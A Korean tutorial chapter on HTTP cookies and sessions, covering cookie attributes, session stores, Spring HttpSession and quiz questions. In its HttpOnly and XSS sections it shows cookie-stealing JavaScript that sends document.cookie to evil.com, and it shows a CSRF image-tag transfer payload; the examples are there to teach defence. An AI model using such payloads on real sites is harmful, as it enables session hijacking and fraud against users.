16. 쿠키와 세션¶

이 챕터의 핵심

HTTP는 무상태(Stateless)야. 요청 끝나면 서버는 너를 까먹어. 그런데 로그인하면 다음 페이지에서도 로그인이 유지되지? 그걸 가능하게 하는 게 쿠키와 세션이다. 이거 모르면 인증/인가 구현할 때 100% 삽질해.

HTTP는 무상태라며, 로그인은 어떻게 유지돼?¶

4장에서 배웠다. HTTP는 Stateless. 각 요청은 독립적이고, 서버는 이전 요청을 기억 안 해.

그러면 이상하지 않아?

  1. 로그인 페이지에서 아이디/비밀번호 입력
  2. 로그인 성공
  3. 마이페이지로 이동
  4. "어? 너 누구야?" ← 서버가 기억 못 하면 이렇게 됨

매 페이지 이동할 때마다 로그인해야 한다고? 미친 짓이지.

그래서 나온 게 쿠키와 세션이야. HTTP의 무상태를 보완하는 메커니즘이다.

쿠키 (Cookie)¶

정의¶

쿠키는 서버가 브라우저에 심는 작은 데이터 조각이다.

서버가 응답할 때 Set-Cookie 헤더로 보내면, 브라우저가 저장해놓고 이후 요청마다 자동으로 Cookie 헤더에 담아서 돌려보낸다.

쿠키의 본질

쿠키는 서버가 브라우저한테 "이거 기억해놔" 하고 맡기는 메모지야. 브라우저는 그 메모지를 들고 다니면서 매번 서버한테 보여준다.

Set-Cookie와 Cookie 흐름¶

sequenceDiagram
    participant B as 브라우저
    participant S as 서버

    B->>S: 1. POST /login (아이디, 비밀번호)
    S-->>B: 2. 200 OK + Set-Cookie: user=junsung
    Note over B: 브라우저가 쿠키 저장

    B->>S: 3. GET /mypage + Cookie: user=junsung
    Note over S: "아, junsung이구나"
    S-->>B: 4. 200 OK (마이페이지 데이터)

    B->>S: 5. GET /orders + Cookie: user=junsung
    Note over S: "또 junsung이네"
    S-->>B: 6. 200 OK (주문 내역)

핵심을 정리하면:

단계 방향 헤더 설명
심기 서버 -> 브라우저 Set-Cookie 서버가 쿠키를 만들어서 보냄
돌려보내기 브라우저 -> 서버 Cookie 브라우저가 자동으로 보냄

브라우저가 알아서 보내는 거야. 개발자가 매번 "쿠키 보내라"고 코드 안 짜도 된다. 브라우저가 해당 도메인 요청할 때 자동으로 붙여준다.

Set-Cookie 실제 예시¶

HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
Set-Cookie: theme=dark; Path=/; Max-Age=31536000

하나의 응답에 Set-Cookie를 여러 개 보낼 수 있다. 각각 별도의 쿠키가 저장된다.

그리고 브라우저는 이후 요청에 이렇게 보낸다:

GET /dashboard HTTP/1.1
Host: example.com
Cookie: sessionId=abc123; theme=dark

Cookie 헤더는 하나에 세미콜론(;)으로 구분해서 다 때려넣는다.

쿠키 속성들¶

여기가 중요하다. 쿠키에는 "이 쿠키를 언제, 어디서, 어떻게 보낼지" 제어하는 속성들이 있다.

Domain¶

Set-Cookie: user=junsung; Domain=example.com

이 쿠키를 어떤 도메인에 보낼지 결정한다.

  • Domain=example.com 설정하면 example.com과 sub.example.com 모두에 전송
  • 생략하면 쿠키를 설정한 정확한 도메인에만 전송 (서브도메인 제외)

다른 도메인에는 못 심어

example.com 서버가 Domain=google.com으로 쿠키를 심으려고 하면? 브라우저가 무시해. 당연하지. 남의 도메인에 쿠키 심으면 보안 개판나니까.

Path¶

Set-Cookie: admin=true; Path=/admin

이 쿠키를 어떤 경로에 보낼지 결정한다.

  • Path=/admin이면 /admin, /admin/users, /admin/settings에 전송
  • / 요청에는 안 보냄
  • 기본값은 쿠키를 설정한 경로

Expires / Max-Age¶

Set-Cookie: token=xyz; Expires=Thu, 01 Jan 2027 00:00:00 GMT
Set-Cookie: token=xyz; Max-Age=3600

쿠키의 유효기간을 결정한다.

속성 설명 예시
Expires 만료 날짜 지정 Expires=Thu, 01 Jan 2027 00:00:00 GMT
Max-Age 만료까지 초 지정 Max-Age=3600 (1시간)
둘 다 없으면 세션 쿠키 브라우저 닫으면 삭제

Max-Age를 더 많이 써

Expires는 절대 시간이라 서버-클라이언트 시간이 다르면 문제가 생겨. Max-Age는 상대 시간이라 더 안전해. 둘 다 있으면 Max-Age가 이긴다.

HttpOnly¶

Set-Cookie: sessionId=abc123; HttpOnly

JavaScript에서 이 쿠키에 접근 못 하게 만든다.

  • document.cookie로 읽을 수 없음
  • XSS(Cross-Site Scripting) 공격 방어의 핵심
  • 세션 ID 같은 민감한 쿠키에는 반드시 붙여야 한다

HttpOnly 안 붙이면 생기는 일

공격자가 XSS로 악성 스크립트를 심으면:

// 공격자의 악성 스크립트
fetch('https://evil.com/steal?cookie=' + document.cookie);

사용자의 세션 ID가 공격자한테 넘어간다. 세션 탈취 완료. HttpOnly 붙이면? document.cookie에서 안 보이니까 훔칠 수 없어.

Secure¶

Set-Cookie: sessionId=abc123; Secure

HTTPS에서만 이 쿠키를 전송한다. HTTP(평문)에서는 안 보냄.

와이파이 카페에서 HTTP로 쿠키가 날아가면? 누군가 가로챌 수 있어. Secure 붙이면 암호화된 HTTPS에서만 전송하니까 안전.

SameSite¶

Set-Cookie: sessionId=abc123; SameSite=Lax

다른 사이트에서 우리 사이트로 요청할 때 쿠키를 보낼지 결정한다. CSRF 공격 방어의 핵심.

값 동작 설명
Strict 완전 차단 다른 사이트에서 오는 모든 요청에 쿠키 안 보냄
Lax 일부 허용 GET 요청 + 링크 클릭은 허용, POST 등은 차단
None 전부 허용 다 보냄. 단, Secure 필수

대부분 Lax면 충분해

Strict는 너무 빡세. 다른 사이트에서 링크 타고 와도 쿠키 안 보내니까 매번 로그인을 다시 해야 해. Lax가 보안과 편의의 균형점이다. 최신 브라우저는 SameSite 미지정 시 Lax를 기본값으로 쓴다.

쿠키 속성 정리¶

실무에서 세션 쿠키를 설정한다면 이렇게:

Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800
속성 이 설정의 의미
Path=/ 모든 경로에서 전송
HttpOnly JS에서 접근 불가 (XSS 방어)
Secure HTTPS에서만 전송 (도청 방어)
SameSite=Lax 타 사이트 POST 차단 (CSRF 방어)
Max-Age=1800 30분 후 만료

세션 (Session)¶

정의¶

세션은 서버가 클라이언트별 상태를 저장하는 공간이다.

쿠키가 "브라우저에 데이터를 맡기는 것"이라면, 세션은 "서버에 데이터를 보관하고, 열쇠(Session ID)만 브라우저에 맡기는 것"이야.

세션의 본질

세션은 서버 측 금고야. 서버가 사용자 정보를 금고에 넣어두고, 열쇠(Session ID)만 쿠키로 브라우저한테 준다. 브라우저는 열쇠만 들고 다니고, 실제 데이터는 서버 금고에 있다.

세션 동작 흐름¶

sequenceDiagram
    participant B as 브라우저
    participant S as 서버
    participant Store as 세션 저장소

    B->>S: 1. POST /login (아이디, 비밀번호)
    S->>Store: 2. 세션 생성 (ID: sess_xyz)
    Note over Store: sess_xyz: {user: "junsung", role: "admin"}
    S-->>B: 3. 200 OK + Set-Cookie: JSESSIONID=sess_xyz

    B->>S: 4. GET /mypage + Cookie: JSESSIONID=sess_xyz
    S->>Store: 5. sess_xyz 조회
    Store-->>S: 6. {user: "junsung", role: "admin"}
    S-->>B: 7. 200 OK (junsung의 마이페이지)

    B->>S: 8. POST /logout + Cookie: JSESSIONID=sess_xyz
    S->>Store: 9. sess_xyz 삭제
    S-->>B: 10. 200 OK + Set-Cookie: JSESSIONID=; Max-Age=0

단계별로 보면:

  1. 로그인 요청: 사용자가 아이디/비밀번호 전송
  2. 세션 생성: 서버가 고유한 Session ID를 만들고, 사용자 정보를 저장
  3. Session ID 전달: Set-Cookie로 Session ID를 브라우저에 전달
  4. 이후 요청: 브라우저가 Cookie에 Session ID를 자동으로 붙여서 전송
  5. 세션 조회: 서버가 Session ID로 저장소에서 사용자 정보를 찾음
  6. 로그아웃: 서버가 세션을 삭제하고, 쿠키를 무효화

세션 저장소¶

세션 데이터를 어디에 저장하느냐에 따라 특성이 달라진다.

저장소 장점 단점 쓰는 경우
메모리 (기본) 빠르다 서버 재시작하면 날아감. 서버 여러 대면 공유 안 됨 개발 환경, 단일 서버
파일 서버 재시작해도 유지 느림, 서버 여러 대면 공유 어려움 거의 안 씀
DB 영속적, 공유 가능 느림 (매 요청마다 DB 조회) 특수한 경우
Redis 빠르고, 서버 간 공유 가능 별도 서버 필요 실무 표준

실무에서는 Redis가 거의 표준

서버를 여러 대 운영하면 (로드밸런싱) 메모리 세션은 못 써. A 서버에서 로그인했는데 B 서버로 요청이 가면 세션이 없으니까. Redis에 세션을 저장하면 모든 서버가 같은 세션 저장소를 바라본다.

Spring에서의 세션¶

Spring(Java)에서는 HttpSession으로 세션을 다룬다.

// 로그인 시 세션에 사용자 정보 저장
@PostMapping("/login")
public String login(HttpSession session, LoginForm form) {
    User user = userService.authenticate(form);
    session.setAttribute("loginUser", user);  // 세션에 저장
    return "redirect:/main";
}

// 다른 요청에서 세션 조회
@GetMapping("/mypage")
public String mypage(HttpSession session) {
    User user = (User) session.getAttribute("loginUser");  // 세션에서 꺼냄
    if (user == null) {
        return "redirect:/login";  // 세션 없으면 로그인 페이지로
    }
    return "mypage";
}

Spring이 알아서 JSESSIONID 쿠키를 관리해준다. 직접 Set-Cookie 헤더를 만들 필요 없어.

쿠키 vs 세션 비교¶

항목 쿠키 세션
저장 위치 브라우저 (클라이언트) 서버
보안 낮음 (사용자가 볼 수 있고, 변조 가능) 높음 (서버에 있으니까)
용량 4KB 제한 (도메인당) 서버 메모리/저장소 한도
속도 빠름 (추가 조회 없음) 서버 조회 필요
서버 부담 없음 세션 저장/조회 비용 발생
유효기간 Max-Age/Expires로 제어 서버 설정 (기본 30분 등)
사용 예 테마 설정, 언어 설정, 자동 로그인 로그인 상태, 장바구니, 사용자 권한

핵심 차이를 기억해

쿠키: 데이터 자체를 브라우저에 저장. 누구나 열어볼 수 있음. 세션: 데이터는 서버에 저장. 브라우저에는 열쇠(Session ID)만 줌.

그래서 비밀번호 같은 민감한 데이터는 절대 쿠키에 직접 넣으면 안 돼. 세션에 저장하고, Session ID만 쿠키로 주는 거야.

보안 위협: XSS와 CSRF¶

쿠키/세션을 쓰면 반드시 알아야 하는 보안 위협 2가지.

XSS (Cross-Site Scripting)¶

공격자가 악성 스크립트를 웹 페이지에 삽입해서 다른 사용자의 쿠키를 훔치는 공격.

sequenceDiagram
    participant 공격자
    participant 웹사이트
    participant 피해자

    공격자->>웹사이트: 1. 게시판에 악성 스크립트 삽입
    Note over 웹사이트: <script>fetch('evil.com?c='+document.cookie)</script>
    피해자->>웹사이트: 2. 게시글 열기
    웹사이트-->>피해자: 3. 악성 스크립트 포함된 페이지
    Note over 피해자: 스크립트 실행됨
    피해자->>공격자: 4. 쿠키(세션ID)가 공격자에게 전송
    공격자->>웹사이트: 5. 훔친 세션ID로 피해자인 척 접속

방어: HttpOnly 쿠키 속성. JavaScript에서 쿠키 접근 자체를 차단.

CSRF (Cross-Site Request Forgery)¶

피해자의 브라우저를 이용해서 피해자 모르게 요청을 보내는 공격.

sequenceDiagram
    participant 피해자
    participant 악성사이트
    participant 은행서버

    피해자->>은행서버: 1. 은행 로그인 (세션 쿠키 받음)
    피해자->>악성사이트: 2. 악성 사이트 방문
    Note over 악성사이트: <img src="bank.com/transfer?to=공격자&amount=100만원">
    악성사이트->>피해자: 3. 이미지 태그 렌더링
    피해자->>은행서버: 4. 자동으로 GET 요청 (쿠키 자동 첨부!)
    Note over 은행서버: 정상 요청으로 보임. 쿠키 있으니까.

브라우저는 bank.com에 요청할 때 해당 도메인의 쿠키를 자동으로 붙인다. 요청이 어디서 시작됐든 상관없이.

방어: SameSite 쿠키 속성. 다른 사이트에서 시작된 요청에 쿠키를 안 보낸다.

보안 속성 정리¶

위협 공격 방식 방어 쿠키 속성
XSS 악성 JS로 쿠키 탈취 HttpOnly
CSRF 다른 사이트에서 요청 위조 SameSite
도청 네트워크에서 쿠키 가로채기 Secure

3대장은 반드시 같이 써

세션 쿠키에는 HttpOnly + Secure + SameSite 무조건 3개 다 넣어. 하나라도 빠지면 구멍이 생긴다.

주의사항 / 함정¶

흔한 실수들

1. "쿠키에 비밀번호 저장해도 되지?"

절대 안 돼. 쿠키는 브라우저 개발자 도구에서 바로 보여. 민감한 데이터는 세션(서버)에 저장하고, Session ID만 쿠키로 줘.

2. "세션이 무조건 좋은 거 아냐?"

아니야. 세션은 서버에 부담을 줘. 사용자 10만 명이면 세션 10만 개. 그래서 JWT 같은 토큰 방식도 쓰는 거야. (나중에 배움)

3. "브라우저 종료하면 세션 사라지나?"

아니야. 세션은 서버에 있어. 브라우저 닫아도 서버 세션은 살아있어. 다만 세션 쿠키(Max-Age 없는 쿠키)는 브라우저 닫으면 사라지니까, Session ID를 잃어버려서 접근 못 하는 거야. 서버의 세션은 타임아웃(보통 30분) 후에 서버가 정리한다.

4. "SameSite=None으로 다 열면 편한데?"

편하긴 한데 CSRF 방어가 없는 거야. None은 반드시 Secure와 함께 써야 하고, 결제, 계정 변경 같은 중요한 요청에는 CSRF 토큰을 별도로 써야 해.

정리¶

개념 한 줄 요약
쿠키 서버가 브라우저에 심는 작은 데이터. 이후 요청마다 자동 전송
세션 서버에 사용자 상태를 저장. Session ID만 쿠키로 주고받음
Set-Cookie 서버 -> 브라우저. 쿠키를 심는 응답 헤더
Cookie 브라우저 -> 서버. 쿠키를 보내는 요청 헤더
HttpOnly JS 접근 차단. XSS 방어
Secure HTTPS에서만 전송. 도청 방어
SameSite 타 사이트 요청 시 쿠키 전송 제어. CSRF 방어
Session ID 세션 금고의 열쇠. 쿠키에 담겨 다님

한 문장 정리

HTTP의 무상태를 보완하기 위해, 쿠키로 브라우저에 데이터를 맡기거나, 세션으로 서버에 데이터를 저장하고 열쇠(Session ID)만 쿠키로 주고받는다.

확인 문제¶

문제 1¶

쿠키가 서버에서 브라우저로 전달될 때 사용하는 HTTP 헤더는?

A. Cookie B. Set-Cookie C. Authorization D. X-Session-ID

정답 보기

B. Set-Cookie

서버 -> 브라우저: Set-Cookie (심기) 브라우저 -> 서버: Cookie (돌려보내기) 방향을 헷갈리면 안 돼. Set-Cookie는 서버가 "이거 저장해"하는 거고, Cookie는 브라우저가 "이거 가지고 왔어"하는 거야.

문제 2¶

HttpOnly 속성이 방어하는 보안 위협은?

A. CSRF B. SQL Injection C. XSS D. DDoS

정답 보기

C. XSS

HttpOnly는 JavaScript에서 document.cookie로 쿠키에 접근하는 것을 막는다. XSS 공격은 악성 JS를 삽입해서 쿠키를 훔치는 건데, HttpOnly가 걸려 있으면 JS에서 쿠키가 안 보이니까 훔칠 수 없어.

문제 3¶

세션에 대한 설명으로 틀린 것은?

A. 세션 데이터는 서버에 저장된다 B. Session ID는 쿠키로 전달된다 C. 브라우저를 닫으면 서버의 세션도 즉시 삭제된다 D. Redis를 세션 저장소로 쓸 수 있다

정답 보기

C. 브라우저를 닫으면 서버의 세션도 즉시 삭제된다

브라우저를 닫으면 세션 쿠키(Session ID)는 사라지지만, 서버의 세션 데이터는 바로 안 사라져. 서버가 타임아웃(보통 30분)을 확인한 후에 정리한다. 브라우저는 열쇠를 잃어버린 것뿐이야.

문제 4¶

SameSite=Lax 설정에서 다른 사이트에서 오는 요청 중 쿠키가 전송되는 경우는?

A. POST 폼 제출 B. AJAX (fetch/XMLHttpRequest) C. 링크 클릭으로 인한 GET 요청 D. iframe 내 요청

정답 보기

C. 링크 클릭으로 인한 GET 요청

Lax는 "최상위 네비게이션(주소창이 바뀌는 이동) + GET"만 허용한다. 링크 클릭해서 이동하는 건 허용하지만, POST 폼, AJAX, iframe 등은 차단해. 그래서 CSRF의 주요 공격 벡터인 POST 위조를 막으면서도 일반적인 링크 이동은 불편하지 않게 해준다.

문제 5¶

서버를 3대로 로드밸런싱하는 환경에서 메모리 세션을 쓰면 생기는 문제는?

A. 쿠키 용량이 초과된다 B. 세션 ID가 중복된다 C. A 서버에서 만든 세션을 B 서버가 모른다 D. HTTPS가 비활성화된다

정답 보기

C. A 서버에서 만든 세션을 B 서버가 모른다

메모리 세션은 해당 서버의 메모리에만 있어. 사용자가 A 서버에서 로그인해서 세션이 A 메모리에 생겼는데, 다음 요청이 B 서버로 가면? B 서버 메모리에는 그 세션이 없어. 그래서 실무에서는 Redis 같은 외부 세션 저장소를 쓴다.
